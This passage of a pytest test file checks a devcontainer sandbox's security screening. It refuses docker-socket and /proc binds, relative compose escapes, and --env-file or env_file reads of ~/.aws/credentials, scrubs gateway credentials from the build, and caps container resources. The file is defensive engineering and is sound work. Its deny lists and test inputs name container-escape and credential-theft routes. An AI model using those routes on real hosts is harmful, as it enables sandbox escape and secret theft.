class TestBuildEnvIsScrubbed:
    """The devcontainer CLI must not inherit gateway channel credentials.

    The CLI resolves ``${localEnv:VAR}`` from ITS OWN environment, so inheriting
    the gateway's would let a trusted config name ``SLACK_BOT_TOKEN`` and have it
    baked into the image or handed to the container. This is the BUILD's
    environment, distinct from the agent exec env scrubbed in ``acp/runtime.py``
    -- two separate surfaces, and scrubbing one says nothing about the other.

    Asserted on the env actually handed to the subprocess, not on the source
    text, so the wrapper cannot be satisfied by a lookalike.

    Revert-verified: dropping ``env=`` lets the denied key through and fails
    ``test_denied_keys_are_absent_from_the_cli_env``.
    """

    @pytest.mark.asyncio
    async def test_denied_keys_are_absent_from_the_cli_env(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        from kiro_crew.sandbox import _AGENT_DENIED_ENV_KEYS

        denied = sorted(_AGENT_DENIED_ENV_KEYS)[0]
        monkeypatch.setenv(denied, "must-not-be-inherited")
        monkeypatch.setenv("DC_HARMLESS_PROBE", "keep-me")

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-env"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        await devc.DevcontainerManager().up(project)

        envs = [kw.get("env") for kw in rec.kwargs if kw.get("env") is not None]
        assert envs, "no env was passed to the CLI at all"
        cli_env = envs[0]
        assert denied not in cli_env, f"{denied} was inherited by the build"
        # The build env is an ALLOWLIST, so an arbitrary host variable is NOT
        # expected to survive -- that is the control, not a side effect. The
        # original form of this assertion expected `DC_HARMLESS_PROBE` to be
        # inherited, which is exactly the shape that let KIRO_API_KEY through.
        assert "DC_HARMLESS_PROBE" not in cli_env, (
            "an un-allowlisted host variable reached the build environment; the "
            "allowlist is what keeps an unenumerated credential out"
        )
        # An over-broad allowlist would break the build, so confirm the CLI still
        # gets what it needs to resolve docker and read ~/.docker.
        assert "PATH" in cli_env
        assert "HOME" in cli_env

    @pytest.mark.asyncio
    async def test_the_kiro_credential_is_not_inherited(
        self,
        tmp_path: Path,
        trust_home: Path,
        cli_stub: None,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """The gateway's own auth credential must not cross into the build.

        Named explicitly because it is the one that got through: it matches none
        of the denylist's five prefixes, so a trusted config could pull it in via
        ``${localEnv:KIRO_API_KEY}``. Measured, not assumed -- ``scrub_env`` alone
        leaves it in place.
        """
        monkeypatch.setenv("KIRO_API_KEY", "must-not-be-inherited")

        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)

        rec = _ExecRecorder(_up_ok("cid-key"))
        monkeypatch.setattr(asyncio, "create_subprocess_exec", rec)

        await devc.DevcontainerManager().up(project)

        envs = [kw.get("env") for kw in rec.kwargs if kw.get("env") is not None]
        assert envs, "no env was passed to the CLI at all"
        assert "KIRO_API_KEY" not in envs[0]


class TestHostControlBindsAreRefused:
    """Binding the container runtime is an escape, not a credential read.

    ``/var/run/docker.sock`` is not a "sensitive path" in the credential sense,
    so neither ``is_sensitive_path`` nor ``path_contains_sensitive`` sees it --
    yet handing it to the agent lets it ask the host daemon for a fresh container
    mounting anything at all, which walks around every path restriction the
    screen enforces. The pseudo-filesystems are the same class of grant.

    Revert-verified: removing the ``_grants_host_control`` check fails every case
    here while the credential-path tests stay green -- they are genuinely
    different checks, not one restated.
    """

    @staticmethod
    def _project(tmp_path: Path, cfg: dict) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return project

    @pytest.mark.parametrize(
        "source",
        [
            "/var/run/docker.sock",
            "/run/docker.sock",
            "/run/podman/podman.sock",
            "/run/containerd/containerd.sock",
            "/proc",
            "/proc/sys",
            "/sys",
            "/sys/fs/cgroup",
            "/dev",
            # Ancestors. A source that merely CONTAINS a control path hands over
            # everything inside it, and an equality-only check accepted all of
            # these: `/run` is not equal to `/run/docker.sock` and is not under
            # `/proc`, so the container got the daemon socket regardless.
            "/",
            "/run",
            "/var/run",
            "/var",
            # Rootless sockets live under /run/user/<uid> (or a custom
            # XDG_RUNTIME_DIR). Those are siblings of /run/docker.sock, so
            # ancestor-of-the-rootful-path cannot see them.
            "/run/user/1000/docker.sock",
            "/run/user/1000/podman/podman.sock",
            "/run/user/1000",
            "/run/user",
            "/tmp/xdg-runtime/docker.sock",
        ],
        ids=[
            "docker-varrun",
            "docker-run",
            "podman",
            "containerd",
            "proc",
            "proc-subtree",
            "sys",
            "cgroup",
            "dev",
            "ancestor-root",
            "ancestor-run",
            "ancestor-var-run",
            "ancestor-var",
            "rootless-docker",
            "rootless-podman",
            "rootless-uid-dir",
            "rootless-tree",
            "custom-xdg-socket",
        ],
    )
    def test_a_runtime_control_bind_is_refused(self, tmp_path: Path, source: str) -> None:
        project = self._project(
            tmp_path, {"image": "x", "mounts": [f"source={source},target=/t,type=bind"]}
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="host control interface"):
            devc.config_digest(cfg)

    def test_the_run_args_spelling_is_refused_too(self, tmp_path: Path) -> None:
        """The socket is most often mounted via runArgs in the wild."""
        project = self._project(
            tmp_path,
            {"image": "x", "runArgs": ["-v", "/var/run/docker.sock:/var/run/docker.sock"]},
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="host control interface"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "source,expected",
        [
            ("/var/run/docker.sock", True),
            ("C:/var/run/docker.sock", True),
            ("C:\\var\\run\\docker.sock", True),
            ("/var/run/docker.sock/", True),
            ("//var//run//docker.sock", True),
            ("/run/user/1000/docker.sock", True),
            ("C:/run/user/1000/docker.sock", True),
            ("/tmp/xdg-runtime/podman.sock", True),
            ("/proc/1", True),
            ("D:\\proc", True),
            ("/opt/proc-tools", False),
            ("/home/u/dev", False),
            ("C:\\Users\\u\\project", False),
            ("/opt/docker.sock.bak", False),
        ],
        ids=[
            "posix",
            "drive-forward",
            "drive-backslash",
            "trailing-slash",
            "double-slash",
            "rootless-posix",
            "rootless-drive",
            "custom-xdg",
            "proc-child",
            "drive-proc",
            "lookalike",
            "benign-posix",
            "benign-windows",
            "socket-lookalike-suffix",
        ],
    )
    def test_control_paths_match_across_host_path_syntaxes(
        self, source: str, expected: bool
    ) -> None:
        """Runs on every platform so the Windows contract is not shard-only.

        A Linux-only check would leave the drive-letter and backslash spellings
        unverified until the Windows shard ran, which is how the POSIX-source
        hole reached CI in the first place.
        """
        assert devc._grants_host_control(source) is expected

    @pytest.mark.parametrize(
        "source,expected",
        [
            ("/var/run/docker.sock", True),
            ("/home/u", True),
            ("\\\\server\\share", True),
            ("C:\\Users\\u", True),
            ("./rel", False),
            ("../up", False),
            ("myvol", False),
        ],
        ids=["posix-abs", "posix-home", "unc", "windows-abs", "dot", "parent", "named"],
    )
    def test_posix_sources_count_as_absolute_on_every_platform(
        self, source: str, expected: bool
    ) -> None:
        """``os.path.isabs`` answers for the HOST's syntax, which is the wrong
        question: a devcontainer spec's sources are POSIX whatever the host is.

        On Windows ``os.path.isabs("/var/run/docker.sock")`` is False, so every
        POSIX-style bind source was misread as relative -- skipped entirely by
        the original screen, and resolved into the project by the relative-bind
        handling. Either way the sensitive-path check never saw it.
        """
        assert devc._is_container_absolute(source) is expected

    def test_a_lookalike_path_is_not_refused(self, tmp_path: Path) -> None:
        """Guards against matching by substring: ``/opt/proc-tools`` is fine.

        A naive ``"/proc" in path`` check would reject this, and a screen that
        rejects ordinary directories is one users route around.
        """
        benign = tmp_path / "proc-tools"
        benign.mkdir()
        project = self._project(
            tmp_path, {"image": "x", "mounts": [f"source={benign},target=/t,type=bind"]}
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)


class TestRelativeComposeBindsAreResolved:
    """A relative compose bind is a path, not a named volume.

    Compose resolves ``../../../x`` against the compose FILE's directory, so it
    can climb out of the project and reach the gateway's own keystone files.
    Skipping every non-absolute source as "not a host path" treated those as
    harmless -- the skip was only correct for named volumes, which have no host
    side at all.

    Revert-verified: restoring the blanket ``not os.path.isabs`` skip fails the
    escape test while leaving the named-volume case green.
    """

    @staticmethod
    def _compose_project(tmp_path: Path, volume: str) -> Path:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(
            f"services:\n  app:\n    image: alpine\n    volumes:\n      - {volume}\n",
            encoding="utf-8",
        )
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        return project

    def test_a_relative_escape_to_a_credential_dir_is_refused(self, tmp_path: Path) -> None:
        """The traversal is COMPUTED, so the test does not depend on what happens
        to sit above the temp directory."""
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        target = os.path.join(os.path.expanduser("~"), ".aws")
        rel = os.path.relpath(target, str(dc))
        project = self._compose_project(tmp_path, f"{rel}:/host")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "volume",
        ["myvol:/data", "./src:/src", "sub/dir:/d"],
        ids=["named-volume", "dot-relative", "plain-relative"],
    )
    def test_benign_sources_are_still_accepted(self, tmp_path: Path, volume: str) -> None:
        project = self._compose_project(tmp_path, volume)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "source,expected",
        [
            ("myvol", False),
            ("./src", True),
            ("../up", True),
            ("a/b", True),
            ("..\\win", True),
            ("/abs", True),
        ],
        ids=["named", "dot", "parent", "nested", "windows-parent", "absolute"],
    )
    def test_named_volumes_are_distinguished_from_paths(self, source: str, expected: bool) -> None:
        assert devc._looks_like_relative_path(source) is expected


class TestContainerResourceCaps:
    """The container must carry the DoS ceilings the host cgroup scope would have.

    The containerized spawn skips ``cgroup_scope_argv``, and namespaces are not a
    substitute: they isolate what a process can SEE, not what it can CONSUME. A
    fork bomb or RSS balloon inside the container lands on the shared host kernel
    just the same.

    Revert-verified: skipping the injection leaves runArgs without any ceiling
    and fails the default cases while the honor-explicit cases still pass, so the
    two behaviors are pinned independently.
    """

    def test_a_bare_config_gets_both_ceilings(self) -> None:
        parsed: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed)
        assert "--pids-limit" in parsed["runArgs"]
        assert "--memory" in parsed["runArgs"]

    def test_the_ceilings_match_the_host_scope(self) -> None:
        """Shared resolution, so the container and host paths cannot drift."""
        from kiro_crew.sandbox import _cgroup_limits_from_config

        max_procs, max_mem_mb, _w, _c = _cgroup_limits_from_config()
        parsed: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed)
        args = parsed["runArgs"]
        assert args[args.index("--pids-limit") + 1] == str(max_procs)
        assert args[args.index("--memory") + 1] == f"{max_mem_mb}m"

    def test_swap_is_pinned_to_the_memory_cap(self) -> None:
        """Without --memory-swap the kernel grants swap equal to the cap, which
        silently doubles the effective ceiling; the host path denies swap too."""
        parsed: dict = {"image": "x"}
        devc._apply_default_resource_caps(parsed)
        args = parsed["runArgs"]
        assert args[args.index("--memory") + 1] == args[args.index("--memory-swap") + 1]

    def test_unrelated_run_args_are_preserved(self) -> None:
        parsed: dict = {"image": "x", "runArgs": ["--network", "host"]}
        devc._apply_default_resource_caps(parsed)
        assert parsed["runArgs"][:2] == ["--network", "host"]

    @pytest.mark.parametrize("flag,value", [("--pids-limit", "64"), ("--memory", "256m")])
    def test_an_explicit_project_limit_is_honored(self, flag: str, value: str) -> None:
        """Overriding a deliberate limit would make the container behave
        differently from the config the user reviewed at the trust prompt."""
        parsed: dict = {"image": "x", "runArgs": [flag, value]}
        devc._apply_default_resource_caps(parsed)
        assert parsed["runArgs"].count(flag) == 1
        assert parsed["runArgs"][parsed["runArgs"].index(flag) + 1] == value

    def test_compose_configs_are_left_alone(self) -> None:
        """Compose ignores runArgs entirely, so injecting there would be a
        no-op that merely looked like a cap. The gap is documented instead."""
        parsed: dict = {"dockerComposeFile": "c.yml", "service": "app"}
        devc._apply_default_resource_caps(parsed)
        assert "runArgs" not in parsed


class TestHostFileReadingFlagsAreScreened:
    """Some docker flags read a host file WITHOUT mounting it.

    ``--env-file`` is the sharp one: pointing it at the gateway's own ``.env``
    copies every credential in that file into the container's environment, and
    the kiro-cli process inside inherits them. No bind mount appears anywhere in
    the config, so a screen that only understood ``-v``/``--mount`` syntax saw
    nothing to check -- the path is the payload even though nothing is bound.

    Revert-verified: dropping the flag handling lets every case here through
    while the bind-mount tests stay green, so this is a distinct surface.
    """

    @staticmethod
    def _project(tmp_path: Path, args: list[str]) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "x", "runArgs": args}).encode())
        return project

    @pytest.mark.parametrize("flag", ["--env-file", "--label-file", "--cidfile"])
    @pytest.mark.parametrize("joined", [False, True], ids=["separate", "joined"])
    def test_a_sensitive_target_is_refused(self, tmp_path: Path, flag: str, joined: bool) -> None:
        target = os.path.join(os.path.expanduser("~"), ".aws", "credentials")
        args = [f"{flag}={target}"] if joined else [flag, target]
        project = self._project(tmp_path, args)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_an_ancestor_target_is_refused(self, tmp_path: Path) -> None:
        """Same both-directions rule as binds: HOME is not itself an entry."""
        project = self._project(tmp_path, ["--env-file", os.path.expanduser("~")])
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_a_benign_env_file_is_accepted(self, tmp_path: Path) -> None:
        """Kept alongside the refusals so a blanket rejection cannot pass."""
        benign = tmp_path / "benign.env"
        benign.write_text("FOO=1\n", encoding="utf-8")
        project = self._project(tmp_path, ["--env-file", str(benign)])
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)


class TestComposeResourceCaps:
    """Compose ignores runArgs, so the caps are injected into the frozen file.

    The compose file is already frozen into the build dir to close a mid-build
    swap window, which makes it the natural place to add the ceilings: the live
    workspace file stays untouched and what the daemon reads is capped.

    Revert-verified: freezing the raw bytes instead leaves the services
    uncapped and fails the default cases while the honor-explicit case passes.
    """

    @staticmethod
    def _project(tmp_path: Path, compose: str) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(compose, encoding="utf-8")
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        return project

    def _frozen_services(self, project: Path) -> dict:
        import yaml

        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        frozen = [f for f in out.parent.iterdir() if f.name.startswith("compose-")]
        assert frozen, "no frozen compose file was written"
        doc = yaml.safe_load(frozen[0].read_text(encoding="utf-8"))
        return doc["services"]

    def test_every_service_is_capped(self, tmp_path: Path, trust_home: Path) -> None:
        """All services, not just the one named by `service`: a sidecar shares
        the same host kernel."""
        project = self._project(
            tmp_path, "services:\n  app:\n    image: alpine\n  db:\n    image: postgres\n"
        )
        services = self._frozen_services(project)
        assert set(services) == {"app", "db"}
        for svc in services.values():
            assert "pids_limit" in svc
            assert "mem_limit" in svc

    def test_swap_is_pinned_to_the_memory_cap(self, tmp_path: Path, trust_home: Path) -> None:
        project = self._project(tmp_path, "services:\n  app:\n    image: alpine\n")
        svc = self._frozen_services(project)["app"]
        assert svc["memswap_limit"] == svc["mem_limit"]

    def test_the_ceilings_match_the_host_scope(self, tmp_path: Path, trust_home: Path) -> None:
        from kiro_crew.sandbox import _cgroup_limits_from_config

        max_procs, max_mem_mb, _w, _c = _cgroup_limits_from_config()
        project = self._project(tmp_path, "services:\n  app:\n    image: alpine\n")
        svc = self._frozen_services(project)["app"]
        assert svc["pids_limit"] == max_procs
        assert svc["mem_limit"] == f"{max_mem_mb}m"

    def test_an_explicit_service_limit_is_honored(self, tmp_path: Path, trust_home: Path) -> None:
        project = self._project(
            tmp_path,
            "services:\n  app:\n    image: alpine\n    pids_limit: 42\n    mem_limit: 128m\n",
        )
        svc = self._frozen_services(project)["app"]
        assert svc["pids_limit"] == 42
        assert svc["mem_limit"] == "128m"

    def test_the_live_workspace_file_is_not_rewritten(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """The project's own file must stay as the user wrote it -- the caps
        belong only to the copy the build consumes."""
        project = self._project(tmp_path, "services:\n  app:\n    image: alpine\n")
        self._frozen_services(project)
        live = (project / ".devcontainer" / "compose.yml").read_text(encoding="utf-8")
        assert "pids_limit" not in live
        assert live == "services:\n  app:\n    image: alpine\n"


class TestExecutionLocus:
    """Where a session landed must be reportable, not just logged.

    ``resolve_for_work_dir`` collapses every negative case to None, which is
    correct for the spawn but loses the distinction the USER needs: having
    granted trust they believe their commands run in the project's container,
    and a transient failure that puts them back on their own filesystem is
    indistinguishable from success. Logging makes it explainable to whoever
    reads the gateway log, which is not the person who granted the trust.

    The reason tokens are a published vocabulary the dashboard maps to plain
    language, so they are asserted by exact value here: renaming one silently
    degrades the UI to generic wording rather than failing.
    """

    @pytest.fixture
    def auto_mode(self, monkeypatch: pytest.MonkeyPatch) -> Iterator[None]:
        class _Cfg:
            class agent:
                devcontainer = "auto"

            @staticmethod
            def load() -> type:
                return _Cfg

        # Reason mapping is platform-independent once Docker is available.
        # Pinned to linux so a stray docker-desktop probe cannot change
        # which gate fires on the Windows and macOS shards.
        monkeypatch.setattr(devc.sys, "platform", "linux")
        # Dev opt-in open: these tests are about WHICH reason the resolver
        # reports, which only happens once the feature is admitted at all. The
        # gate-shut behavior is TestDevOptInGate's subject.
        monkeypatch.setenv(devc.DEVCONTAINER_ENV_VAR, "1")
        with patch("kiro_crew.config.loader.KiroCrewConfig", _Cfg):
            yield

    @staticmethod
    def _project(tmp_path: Path) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps({"image": "alpine"}).encode())
        return project

    @pytest.mark.asyncio
    async def test_no_config_reports_nothing(self, tmp_path: Path, auto_mode: None) -> None:
        """A project with no devcontainer has no second world to have landed in,
        so reporting "host" would invent a distinction it does not have."""
        bare = tmp_path / "bare"
        bare.mkdir()
        info, locus = await devc.resolve_with_locus(bare)
        assert info is None
        assert locus is None

    @pytest.mark.asyncio
    async def test_a_desktop_host_is_eligible_and_names_missing_docker(
        self, tmp_path: Path, auto_mode: None, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Docker Desktop is a supported host. A project with no config still
        reports nothing; a project with a config and no docker names that,
        not an "unsupported platform" the operator cannot act on.
        """
        monkeypatch.setattr(devc.sys, "platform", "darwin")

        bare = tmp_path / "bare"
        bare.mkdir()
        _info, locus = await devc.resolve_with_locus(bare)
        assert locus is None, "a project with no config must report nothing"

        project = self._project(tmp_path)
        with patch.object(devc, "docker_available", return_value=False):
            info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is not None
        assert locus.reason == "docker_unavailable"

    @pytest.mark.asyncio
    async def test_docker_missing_is_named(self, tmp_path: Path, auto_mode: None) -> None:
        project = self._project(tmp_path)
        with patch.object(devc, "docker_available", return_value=False):
            info, locus = await devc.resolve_with_locus(project)
        assert info is None
        assert locus is not None
        assert locus.mode == "host"
        assert locus.reason == "docker_unavailable"

    @pytest.mark.asyncio
    async def test_missing_trust_is_named(self, tmp_path: Path, auto_mode: None) -> None:
        project = self._project(tmp_path)
        with (
            patch.object(devc, "docker_available", return_value=True),
            patch.object(devc, "is_trusted", return_value=False),
        ):
            _info, locus = await devc.resolve_with_locus(project)
        assert locus is not None
        assert locus.reason == "untrusted"

    @pytest.mark.asyncio
    async def test_a_config_edit_racing_the_grant_is_distinguished_from_a_build_failure(
        self, tmp_path: Path, auto_mode: None
    ) -> None:
        """Two different causes the user can act on differently: re-grant trust
        versus look at a build log."""
        project = self._project(tmp_path)

        async def _raced(_w: object) -> object:
            raise devc.DevcontainerNotTrusted("raced")

        async def _boom(_w: object) -> object:
            raise RuntimeError("build exploded")

        for hook, expected in ((_raced, "config_changed"), (_boom, "build_failed")):
            mgr = SimpleNamespace(up=hook)
            with (
                patch.object(devc, "docker_available", return_value=True),
                patch.object(devc, "is_trusted", return_value=True),
                patch.object(devc, "get_manager", return_value=mgr),
            ):
                info, locus = await devc.resolve_with_locus(project)
            assert info is None
            assert locus is not None
            assert locus.reason == expected

    @pytest.mark.asyncio
    async def test_success_names_the_container_and_carries_no_reason(
        self, tmp_path: Path, auto_mode: None
    ) -> None:
        project = self._project(tmp_path)
        built = devc.DevcontainerInfo(
            container_id="abc123",
            remote_workspace_folder="/w",
            remote_user="vscode",
            project_dir=str(project),
            config_digest="d" * 64,
            created_at=0.0,
        )

        async def _up(_w: object) -> devc.DevcontainerInfo:
            return built

        with (
            patch.object(devc, "docker_available", return_value=True),
            patch.object(devc, "is_trusted", return_value=True),
            patch.object(devc, "get_manager", return_value=SimpleNamespace(up=_up)),
        ):
            info, locus = await devc.resolve_with_locus(project)
        assert info is built
        assert locus is not None
        assert locus.mode == "container"
        assert locus.container_name == "abc123"
        assert locus.reason is None

    @pytest.mark.asyncio
    async def test_the_verdict_is_retrievable_afterwards(
        self, tmp_path: Path, auto_mode: None
    ) -> None:
        """The dashboard reads the RECORDED verdict instead of resolving again,
        which would probe docker on a UI request and could disagree with the
        world the session is actually in."""
        project = self._project(tmp_path)
        assert devc.execution_locus_for(project) is None
        with patch.object(devc, "docker_available", return_value=False):
            await devc.resolve_with_locus(project)
        recorded = devc.execution_locus_for(str(project))
        assert recorded is not None
        assert recorded.reason == "docker_unavailable"

    def test_an_unknown_work_dir_has_no_verdict(self) -> None:
        assert devc.execution_locus_for("/nonexistent-project") is None
        assert devc.execution_locus_for(None) is None
        assert devc.execution_locus_for("") is None

    def test_the_payload_matches_the_published_shape(self) -> None:
        """The dashboard and the frontend agree on exactly these three keys."""
        payload = devc.ExecutionLocus("host", reason="untrusted").as_payload()
        assert payload == {"mode": "host", "container_name": None, "reason": "untrusted"}

    def test_recording_none_clears_a_stale_verdict(self, tmp_path: Path) -> None:
        """A project that stops shipping a devcontainer must stop reporting one,
        rather than leaving the last container verdict on screen forever."""
        devc.record_execution_locus("/p", devc.ExecutionLocus("container"))
        assert devc.execution_locus_for("/p") is not None
        devc.record_execution_locus("/p", None)
        assert devc.execution_locus_for("/p") is None


class TestSlotPayloadWithholdsAnUnattributableVerdict:
    """The slot reports nothing from the work-dir table.

    The recorded verdict is keyed by WORK DIR, and several sessions can share a
    project. A host-fallback session followed by a containerized session on the
    same project would read the newer verdict and claim "in container" -- the
    exact false reassurance the indicator exists to prevent. The slot reports
    only a verdict snapshotted onto itself.
    """

    @staticmethod
    def _slot(project: str) -> object:
        from kiro_crew.dashboard.state import _ChatSlot

        slot = _ChatSlot.__new__(_ChatSlot)
        slot.project = project
        return slot

    def test_a_recorded_container_verdict_is_not_reported(self, tmp_path: Path) -> None:
        """The dangerous direction: claiming a container for a host session."""
        devc.record_execution_locus(
            str(tmp_path), devc.ExecutionLocus("container", container_name="c1")
        )
        try:
            assert self._slot(str(tmp_path))._execution_payload() is None
        finally:
            devc.record_execution_locus(str(tmp_path), None)

    def test_a_recorded_host_verdict_is_not_reported_either(self, tmp_path: Path) -> None:
        """Withheld symmetrically: a stale host warning on a project whose
        sessions now containerize would be its own kind of wrong."""
        devc.record_execution_locus(
            str(tmp_path), devc.ExecutionLocus("host", reason=devc.HOST_REASON_UNTRUSTED)
        )
        try:
            assert self._slot(str(tmp_path))._execution_payload() is None
        finally:
            devc.record_execution_locus(str(tmp_path), None)

    def test_two_sessions_on_one_project_cannot_read_each_others_verdict(
        self, tmp_path: Path
    ) -> None:
        """The scenario itself, spelled out: the second resolve overwrites the
        first, and the first session must not inherit it."""
        first = self._slot(str(tmp_path))
        devc.record_execution_locus(
            str(tmp_path), devc.ExecutionLocus("host", reason=devc.HOST_REASON_DOCKER_UNAVAILABLE)
        )
        second = self._slot(str(tmp_path))
        devc.record_execution_locus(
            str(tmp_path), devc.ExecutionLocus("container", container_name="c2")
        )
        try:
            assert first._execution_payload() is None
            assert second._execution_payload() is None
        finally:
            devc.record_execution_locus(str(tmp_path), None)

    def test_the_recording_side_still_works(self, tmp_path: Path) -> None:
        """The resolver keeps recording, so reporting can be switched on again
        once attribution exists rather than rebuilt from nothing."""
        devc.record_execution_locus(
            str(tmp_path), devc.ExecutionLocus("host", reason=devc.HOST_REASON_BUILD_FAILED)
        )
        try:
            recorded = devc.execution_locus_for(str(tmp_path))
            assert recorded is not None
            assert recorded.reason == "build_failed"
        finally:
            devc.record_execution_locus(str(tmp_path), None)


class TestSlotPayloadReportsASnapshottedVerdict:
    """A locus stored on the slot itself is attributable and is reported."""

    @staticmethod
    def _slot(project: str, locus: object | None = None) -> object:
        from kiro_crew.dashboard.state import _ChatSlot

        slot = _ChatSlot.__new__(_ChatSlot)
        slot.project = project
        slot._execution_locus = locus
        return slot

    def test_a_slot_owned_container_verdict_is_reported(self) -> None:
        locus = devc.ExecutionLocus("container", container_name="c1")
        assert self._slot("/p", locus)._execution_payload() == {
            "mode": "container",
            "container_name": "c1",
            "reason": None,
        }

    def test_two_slots_keep_independent_verdicts(self) -> None:
        host = self._slot("/p", devc.ExecutionLocus("host", reason=devc.HOST_REASON_UNTRUSTED))
        container = self._slot("/p", devc.ExecutionLocus("container", container_name="c2"))
        assert host._execution_payload()["mode"] == "host"
        assert container._execution_payload()["mode"] == "container"


class TestComposeEnvFileIsScreened:
    """``env_file`` reads a host file and injects it as the service environment.

    No bind appears in ``volumes``, so a screen that only enumerated binds saw
    nothing to check -- while the in-container agent inherits every credential in
    the named file. Same class as ``runArgs --env-file``, a different surface.

    Revert-verified: dropping the env_file collection lets every case here
    through while the volumes cases stay green.
    """

    @staticmethod
    def _project(tmp_path: Path, body: str) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(
            f"services:\n  app:\n    image: alpine\n{body}", encoding="utf-8"
        )
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        return project

    @pytest.mark.parametrize(
        "template",
        [
            "    env_file: {t}\n",
            "    env_file:\n      - {t}\n",
            "    env_file:\n      - path: {t}\n",
        ],
        ids=["string", "list", "long-form"],
    )
    def test_a_sensitive_env_file_is_refused(self, tmp_path: Path, template: str) -> None:
        target = os.path.join(os.path.expanduser("~"), ".aws", "credentials")
        project = self._project(tmp_path, template.format(t=target))
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_an_ancestor_env_file_is_refused(self, tmp_path: Path) -> None:
        project = self._project(tmp_path, f"    env_file: {os.path.expanduser('~')}\n")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_a_benign_env_file_is_accepted(self, tmp_path: Path) -> None:
        """Kept beside the refusals so a blanket rejection cannot pass."""
        benign = tmp_path / "ok.env"
        benign.write_text("A=1\n", encoding="utf-8")
        project = self._project(tmp_path, f"    env_file: {benign}\n")
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)


class TestFrozenComposePathsDoNotReAnchor:
    """Freezing MOVES the compose file, so a relative source changes meaning.

    Compose resolves relative binds against the compose file's own directory.
    Screening resolves them against the ORIGINAL directory (`.devcontainer`), but
    the frozen copy lives in the build dir under the gateway's data home -- so a
    source like ``../../../../.env`` screens harmlessly and then resolves onto the
    gateway's own files once frozen. Screened path and built path were two
    resolutions that had to agree, and did not.

    They are now the same string by construction: relative host paths are
    absolutized against the original directory when the copy is written.
    Corrected rather than refused, because ``..:/workspace`` is how a
    devcontainer compose normally mounts the project.

    Revert-verified: writing the raw bytes leaves relative sources in the frozen
    copy and fails the agreement assertions here.
    """

    @staticmethod
    def _project(tmp_path: Path, body: str) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(
            f"services:\n  app:\n    image: alpine\n{body}", encoding="utf-8"
        )
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        return project

    def _frozen_app(self, project: Path) -> tuple[dict, Path]:
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        out = devc.write_build_config(str(project), devc.config_digest(cfg))
        frozen = [f for f in out.parent.iterdir() if f.name.startswith("compose-")]
        assert frozen
        doc = yaml.safe_load(frozen[0].read_text(encoding="utf-8"))
        return doc["services"]["app"], out.parent

    def test_a_relative_bind_is_absolutized_to_the_screened_target(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        project = self._project(tmp_path, "    volumes:\n      - ../src:/src\n")
        app, _build_dir = self._frozen_app(project)
        # Split with the production helper, not str.split(":"): on Windows the
        # absolutized host side is "C:\...", so a naive split returns "C".
